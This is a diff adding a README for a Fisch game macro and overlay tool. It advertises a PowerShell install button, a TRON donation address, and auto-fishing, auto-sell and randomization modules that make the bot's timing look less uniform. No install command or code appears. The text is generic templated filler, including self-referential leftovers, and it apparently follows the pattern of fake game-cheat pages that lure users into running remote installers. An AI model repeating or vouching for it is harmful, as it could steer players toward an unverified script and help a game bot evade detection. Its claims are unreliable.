@@ -1,0 +1,105 @@
+🎮 Fisch Script Macro Betalan — Game Enhancer for Windows 10/11
+
+📦 PowerShell Install Button
+
+Show your support
+
+TRON:&nbsp;TJCmsScz7AHEcK2SHDPZqrat7eyj4AqKLw
+
+Fisch Script Macro Betalan is a focused gameplay assistance layer built for players who want cleaner execution and sharper information without touching the core game. It delivers macro-driven action support alongside real-time information overlays, so routine inputs land consistently and the details you need stay visible during play. Everything runs as lightweight assistance on top of the existing experience—no unrelated overhauls, no reinventing the game. What you get is a tighter, more informed way to play.
+
+🔧 Requirements
+
+- Windows 10 or Windows 11
+- PowerShell 5.1 or newer (already available on Windows)
+- Active network connection
+- No admin rights needed
+
+Features
+
+- Real-time gameplay assistance — surfaces actionable context while you play, tuned for the Fisch loop so the info you need shows up when it matters.
+- Information overlays — clean, readable on-screen panels that deliver live stats and status without pulling you out of the action.
+- Macro-driven automation — handles repetitive inputs and routine sequences so you can focus on decisions instead of grind.
+- Betalan-tuned behavior — pacing and response logic calibrated for stable, predictable performance during extended sessions.
+- Lightweight footprint — runs lean alongside the game, keeping overhead low and frame stability intact.
+- Configurable at a glance — toggle overlays and assistance layers on or off without digging through menus.
+- Built for the target project — purpose-built for Fisch Script Macro Betalan, with no unrelated overhauls or scope creep.
+
+How it works
+
+Fisch Script Macro Betalan runs as a lightweight external companion that hooks into the game's render and input pipeline without touching game assets or core files. On launch, it reads the active game window, calibrates screen coordinates, and starts its macro engine in the background.
+
+From there, the macro layer watches for the cues that matter—bite indicators, cast states, inventory prompts—and fires the matching input sequence the moment they appear. Timing is driven by configurable polling intervals, so reaction speed stays consistent whether you're farming, questing, or just letting it idle.
+
+The information overlay sits on top of the game window and streams live data: current macro state, active profile, recent triggers, and session counters. It renders independently of the game, so it never interferes with the client and can be toggled off at any time.
+
+Everything is driven by profiles. Each profile bundles its own trigger rules, key binds, and overlay layout, letting you swap setups without restarting the tool. Edits made in the config apply on the fly—no reinstall, no reload.
+
+Modules and Settings
+
+Cast and Reel Automation
+This module drives the core fishing loop by handling line casting and retrieval so the session can continue without repeated manual clicks. It acts as the engine that the other modules attach to.
+
+- Cast Interval sets how long the macro waits between finishing one cycle and starting the next cast, controlling overall session pace.
+- Reel Delay determines how long the tool waits before pulling the line back in, letting users match their preferred reaction window.
+- Loop Continuity toggles whether the cycle repeats indefinitely or pauses after a set number of casts.
+- Manual Override lets the user interrupt a cycle at any point, with automation resuming from the next cast rather than mid-action.
+
+Bite Detection and Reel Response
+This module listens for bite signals during the waiting phase and triggers the reel action in response, so the loop reacts to actual bites rather than running on fixed intervals alone.
+
+- Detection Sensitivity adjusts how readily the tool registers a bite signal, useful when bite feedback varies between spots.
+- Response Delay adds a short buffer between detecting a bite and reeling, so the reaction timing feels natural to the user's preference.
+- Fallback Reel enables a timed reel if no bite is detected within a waiting window, preventing the loop from stalling.
+- Bite Logging records each detected bite in the activity log so users can review reaction timing afterward.
+
+Auto-Sell Routine
+This module clears collected catches from inventory so long sessions do not stall on a full inventory. It coordinates with the cast loop by pausing fishing while a sell pass runs, then resuming.
+
+- Sell Mode chooses between selling after every catch or accumulating catches and selling in batches.
+- Batch Threshold sets how many catches trigger a sell pass when batch mode is active.
+- Sell Timing controls the pause length around a sell pass so the routine completes before casting resumes.
+- Sell Confirmation toggles a brief status message in the log each time a sell pass finishes.
+
+Timing Profiles
+This module stores separate timing values for casting, waiting, reeling and selling, letting users keep distinct configurations for different fishing spots or play styles instead of one fixed cadence.
+
+- Profile Slots hold multiple named timing sets that can be switched between sessions or mid-session.
+- Per-Action Timing separates cast, wait, reel and sell delays so each phase can be tuned independently.
+- Profile Switching applies a stored profile to the active loop without restarting the tool.
+- Profile Duplication copies an existing profile as a starting point for adjustments, keeping the original intact.
+
+Session Controls and Status Display
+This module provides the start, stop and pause controls plus the on-screen status area, giving users visibility into what the macro is doing at any moment.
+
+- Start and Stop controls begin or end automation cleanly, with stop taking effect without closing the game.
+- Pause and Resume suspend the loop and pick it up later in the same session.
+- Status Area shows the current phase, such as casting, waiting for a bite, reeling or selling.
+- Activity Log keeps a running record of recent actions for post-session review.
+
+Bite and Catch Filters
+This module decides which catches are kept and which are routed to the sell routine, based on in-game attributes the tool can read.
+
+- Keep Rules define conditions under which a catch stays in inventory.
+- Sell Rules define conditions that send a catch to the auto-sell routine instead.
+- Filter Priority resolves cases where a catch matches both keep and sell conditions.
+- Filter Presets store filter setups for different sessions so priorities can be swapped quickly.
+
+Configurable Randomization
+This module adds user-set variation to delays and action ordering so the loop does not repeat an identical pattern every cycle, while overall pacing stays under user control.
+
+- Delay Variation Range sets how much each action's timing can deviate from its configured value.
+- Per-Action Randomization applies variation to selected action types only, leaving others fixed.
+- Order Variation introduces small changes in the sequence of secondary actions within a cycle.
+- Randomization Toggle disables variation entirely when a strict, predictable cadence is preferred.
+
+Additional Settings
+These optional controls sit across the modules and adjust how the tool behaves as a whole.
+
+- Master Enable switches all automation off while keeping profiles, filters and logs intact.
+- Log Detail Level controls how much information the activity log records per action.
+- Status Overlay Position moves the on-screen status area so it does not obscure important game elements.
+- Notification Sounds add an optional audible cue when a sell pass completes or a session stops.
+- Profile Import and Export let users carry timing and filter setups between sessions without rebuilding them.
+
+…（内容已截断）
